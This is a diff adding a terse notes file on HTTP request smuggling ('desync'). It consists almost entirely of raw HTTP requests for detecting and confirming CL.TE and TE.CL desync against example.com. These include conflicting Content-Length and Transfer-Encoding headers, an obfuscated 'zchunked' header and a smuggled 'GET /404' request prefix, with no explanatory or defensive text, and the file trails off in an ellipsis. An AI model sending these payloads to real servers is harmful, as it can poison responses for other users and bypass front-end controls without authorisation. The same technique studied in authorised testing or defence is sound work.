@@ -1,0 +1,50 @@
+DEsync
+
+
+
+
+DETECTING
+1) CL &TE
+
+POST /about HTTP/1.1
+Host: example.com
+Transfer-Encoding: chunked
+Content-Length: 4
+
+1
+Z
+Q
+
+
+
+2)POST /about HTTP/1.1
+Host: example.com
+Transfer-Encoding: chunked
+Content-Length: 6
+
+0
+
+X
+
+
+
+CONFIRMING
+
+1)CL & TE 
+
+POST /search HTTP/1.1
+Host: example.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 51
+Transfer-Encoding: zchunked
+
+11
+=x&q=smuggling&x=
+0
+
+GET /404 HTTP/1.1
+Foo: bPOST /search HTTP/1.1
+Host: example.com
+… 
+
+
